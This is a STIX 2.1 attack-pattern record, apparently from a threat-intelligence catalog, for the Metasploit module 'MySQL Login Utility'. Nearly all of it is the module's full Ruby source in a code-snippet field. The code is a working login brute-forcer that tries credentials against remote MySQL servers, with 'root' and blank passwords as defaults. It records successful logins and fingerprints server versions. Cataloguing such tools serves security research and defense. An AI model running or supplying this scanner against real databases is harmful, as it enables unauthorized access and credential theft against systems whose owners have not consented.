{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9b24c261-8b7e-4004-b5b9-bf623ea392b5",
    "created": "2024-08-14T16:31:17.842887Z",
    "modified": "2024-08-14T16:31:17.84289Z",
    "name": "MySQL Login Utility",
    "description": "This module simply queries the MySQL instance for a specific user/pass (default is root with blank).",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/mysql/mysql_login.rb",
            "external_id": "mysql_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/mysql'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MYSQL\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'MySQL Login Utility',\n      'Description' => 'This module simply queries the MySQL instance for a specific user/pass (default is root with blank).',\n      'Author'      => [ 'Bernardo Damele A. G. <bernardo.damele[at]gmail.com>' ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      # some overrides from authbrute since there is a default username and a blank password\n      'DefaultOptions' =>\n        {\n          'USERNAME' => 'root',\n          'BLANK_PASSWORDS' => true\n        }\n    ))\n\n    register_options(\n      [\n        Opt::Proxies\n      ])\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def target\n    [rhost,rport].join(\":\")\n  end\n\n\n  def run_host(ip)\n    begin\n      if mysql_version_check(\"4.1.1\") # Pushing down to 4.1.1.\n        cred_collection = build_credential_collection(\n            username: datastore['USERNAME'],\n            password: datastore['PASSWORD']\n        )\n\n        scanner = Metasploit::Framework::LoginScanner::MySQL.new(\n            host: ip,\n            port: rport,\n            proxies: datastore['PROXIES'],\n            cred_details: cred_collection,\n            stop_on_success: datastore['STOP_ON_SUCCESS'],\n            bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n            connection_timeout: 30,\n            max_send_size: datastore['TCP::max_send_size'],\n            send_delay: datastore['TCP::send_delay'],\n            framework: framework,\n            framework_module: self,\n            ssl: datastore['SSL'],\n            ssl_version: datastore['SSLVersion'],\n            ssl_verify_mode: datastore['SSLVerifyMode'],\n            ssl_cipher: datastore['SSLCipher'],\n            local_port: datastore['CPORT'],\n            local_host: datastore['CHOST']\n        )\n\n        scanner.scan! do |result|\n          credential_data = result.to_h\n          credential_data.merge!(\n              module_fullname: self.fullname,\n              workspace_id: myworkspace_id\n          )\n          if result.success?\n            credential_core = create_credential(credential_data)\n            credential_data[:core] = credential_core\n            create_credential_login(credential_data)\n\n            print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\"\n          else\n            invalidate_login(credential_data)\n            vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"\n          end\n        end\n\n      else\n        vprint_error \"#{target} - Unsupported target version of MySQL detected. Skipping.\"\n      end\n    rescue ::Rex::ConnectionError, ::EOFError => e\n      vprint_error \"#{target} - Unable to connect: #{e.to_s}\"\n    end\n  end\n\n  # Tmtm's rbmysql is only good for recent versions of mysql, according\n  # to http://www.tmtm.org/en/mysql/ruby/. We'll need to write our own\n  # auth checker for earlier versions. Shouldn't be too hard.\n  # This code is essentially the same as the mysql_version module, just less\n  # whitespace and returns false on errors.\n  def mysql_version_check(target=\"5.0.67\") # Oldest the library claims.\n    begin\n      s = connect(false)\n      data = s.get\n      disconnect(s)\n    rescue ::Rex::ConnectionError, ::EOFError => e\n      raise e\n    rescue ::Exception => e\n      vprint_error(\"#{rhost}:#{rport} error checking version #{e.class} #{e}\")\n      return false\n    end\n    offset = 0\n    l0, l1, l2 = data[offset, 3].unpack('CCC')\n    return false if data.length < 3\n    length = l0 | (l1 << 8) | (l2 << 16)\n    # Read a bad amount of data\n    return if length != (data.length - 4)\n    offset += 4\n    proto = data[offset, 1].unpack('C')[0]\n    # Error condition\n    return if proto == 255\n    offset += 1\n    version = data[offset..-1].unpack('Z*')[0]\n    report_service(:host => rhost, :port => rport, :name => \"mysql\", :info => version)\n    short_version = version.split('-')[0]\n    vprint_good \"#{rhost}:#{rport} - Found remote MySQL version #{short_version}\"\n    int_version(short_version) >= int_version(target)\n  end\n\n  # Takes a x.y.z version number and turns it into an integer for\n  # easier comparison. Useful for other things probably so should\n  # get moved up to Rex. Allows for version increments up to 0xff.\n  def int_version(str)\n    int = 0\n    begin # Okay, if you're not exactly what I expect, just return 0\n      return 0 unless str =~ /^[0-9]+\\x2e[0-9]+/\n      digits = str.split(\".\")[0,3].map {|x| x.to_i}\n      digits[2] ||= 0 # Nil protection\n      int =  (digits[0] << 16)\n      int += (digits[1] << 8)\n      int += digits[2]\n    rescue\n      return int\n    end\n  end\n\n\n\nend\n"
}